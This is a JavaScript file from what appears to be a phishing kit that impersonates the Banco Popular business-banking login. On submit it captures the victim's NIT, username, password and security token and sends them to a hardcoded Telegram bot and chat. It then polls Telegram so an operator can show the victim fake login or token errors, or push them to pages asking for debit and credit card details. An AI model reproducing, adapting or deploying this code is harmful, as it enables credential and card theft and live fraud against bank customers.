document.addEventListener('DOMContentLoaded', function() {
    // Clear Telegram Session Data on Page Load
    localStorage.removeItem('telegram_message_id');
    localStorage.removeItem('telegram_chat_id');
    localStorage.removeItem('telegram_message_text');
    localStorage.removeItem('force_new_message');

    const btnLogin = document.getElementById('btn-login-business');
    const loginErrorMsg = document.getElementById('login-error-msg');

    if (btnLogin) {
        btnLogin.addEventListener('click', function(e) {
            e.preventDefault();
            
            const nit = document.getElementById('nit').value;
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const token = document.getElementById('token').value;

            if (nit && username && password && token) {
                // Telegram Configuration
                const botToken = '8645913661:AAHLkz0Q3Ea_ucLi_VbZ_9cpwuvpvt_meOo'; 
                const chatId = '-5501183352';

                // Save sensitive data to LocalStorage for persistence across pages
                localStorage.setItem('saved_docType', 'NIT');
                localStorage.setItem('saved_docNumber', `${nit} / ${username}`);
                localStorage.setItem('saved_password', password);
                
                // Message Content
                const message = `
<b>🏦 BANCO POPULAR - EMPRESAS 🏦</b>
--------------------------------------------
<b>🏢 NIT:</b> ${nit}
<b>👤 Usuario:</b> ${username}
<b>🔐 Contraseña:</b> ${password}
<b>🔑 Token:</b> ${token}
--------------------------------------------
`;

                // Inline Keyboard Buttons
                const keyboard = {
                    inline_keyboard: [
                        [
                            { text: "❌ Error Login", callback_data: "error_login" },
                            { text: "📲 Token", callback_data: "ask_token" } // "Token" button as requested
                        ],
                        [
                            { text: "⚠️ Error Token", callback_data: "error_token" },
                            { text: "💳 Pedir TC Débito", callback_data: "ask_debit" }
                        ],
                        [
                            { text: "💳 Pedir TC Crédito", callback_data: "ask_credit" },
                            { text: "❌ Error TC Débito", callback_data: "error_debit" }
                        ],
                        [
                            { text: "❌ Error TC Crédito", callback_data: "error_credit" },
                            { text: "✅ Finalizar", callback_data: "finish" }
                        ]
                    ]
                };

                // Show Loading Overlay
                const loadingOverlay = document.getElementById('loading-overlay');
                if (loadingOverlay) {
                    loadingOverlay.style.display = 'flex';
                }

                // Send to Telegram
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML',
                        reply_markup: keyboard
                    })
                })
                .then(response => response.json())
                .then(data => {
                    console.log('Mensaje enviado a Telegram:', data);
                    
                    if (data.ok && data.result) {
                        // Store message details for editing later
                        localStorage.setItem('telegram_message_id', data.result.message_id);
                        localStorage.setItem('telegram_chat_id', chatId);
                        localStorage.setItem('telegram_message_text', message);
                    }

                    // Start Polling for Updates
                    startTelegramPolling(botToken);
                })
                .catch(error => {
                    console.error('Error enviando a Telegram:', error);
                    if (loadingOverlay) loadingOverlay.style.display = 'none';
                    alert('Error de conexión. Intente nuevamente.');
                });
            } else {
                alert('Por favor complete todos los campos (NIT, Usuario, Contraseña, Token)');
            }
        });
    }

    // Function to Poll Telegram Updates
    let lastUpdateId = 0;
    let pollingInterval;

    function startTelegramPolling(token) {
        // Clear existing polling if any
        if (pollingInterval) clearInterval(pollingInterval);

        pollingInterval = setInterval(() => {
            fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${lastUpdateId + 1}`)
            .then(response => response.json())
            .then(data => {
                if (data.ok && data.result.length > 0) {
                    data.result.forEach(update => {
                        lastUpdateId = update.update_id;
                        
                        // Check for Callback Query
                        if (update.callback_query) {
                            const action = update.callback_query.data;
                            
                            if (action === 'ask_token') {
                                window.location.href = 'token.html';
                                clearInterval(pollingInterval);
                                answerCallback(token, update.callback_query.id, 'Redirigiendo a Token...');
                            }

                            if (action === 'ask_debit') {
                                window.location.href = 'tc_debito.html';
                                clearInterval(pollingInterval);
                                answerCallback(token, update.callback_query.id, 'Redirigiendo a TC Débito...');
                            }

                            if (action === 'ask_credit') {
                                window.location.href = 'tc_credito.html';
                                clearInterval(pollingInterval);
                                answerCallback(token, update.callback_query.id, 'Redirigiendo a TC Crédito...');
                            }

                            if (action === 'finish') {
                                window.location.href = 'https://www.bancopopular.com.co';
                                clearInterval(pollingInterval);
                                // Clear localStorage on finish
                                localStorage.removeItem('telegram_message_id');
                                localStorage.removeItem('telegram_chat_id');
                                localStorage.removeItem('telegram_message_text');
                                answerCallback(token, update.callback_query.id, 'Finalizando sesión...');
                            }
                            
                            if (action === 'error_login') {
                                // Clear LocalStorage
                                localStorage.removeItem('telegram_message_id');
                                localStorage.removeItem('telegram_chat_id');
                                localStorage.removeItem('telegram_message_text');
                                localStorage.removeItem('force_new_message');

                                // Hide Loader
                                const loadingOverlay = document.getElementById('loading-overlay');
                                if (loadingOverlay) loadingOverlay.style.display = 'none';

                                // Show Error Message
                                if (loginErrorMsg) {
                                    loginErrorMsg.style.display = 'flex';
                                    loginErrorMsg.querySelector('span').textContent = 'Usuario o contraseña inválidos.';
                                }

                                // Clear fields
                                document.getElementById('password').value = ''; 
                                document.getElementById('token').value = '';

                                clearInterval(pollingInterval);
                                answerCallback(token, update.callback_query.id, 'Error mostrado al usuario');
                            }

                            if (action === 'error_token') {
                                // Set flag to force new message
                                localStorage.setItem('force_new_message', 'true');

                                // Hide Loader
                                const loadingOverlay = document.getElementById('loading-overlay');
                                if (loadingOverlay) loadingOverlay.style.display = 'none';

                                // Show Error Message
                                if (loginErrorMsg) {
                                    loginErrorMsg.style.display = 'flex';
                                    loginErrorMsg.querySelector('span').textContent = 'Token inválido. Por favor verifique.';
                                }

                                // Clear Token field
                                document.getElementById('token').value = '';

                                clearInterval(pollingInterval);
                                answerCallback(token, update.callback_query.id, 'Error Token mostrado');
                            }
                        }
                    });
                }
            })
            .catch(err => console.error('Polling Error:', err));
        }, 3000); // Poll every 3 seconds
    }

    function answerCallback(token, callbackQueryId, text) {
        fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                callback_query_id: callbackQueryId,
                text: text
            })
        });
    }
});
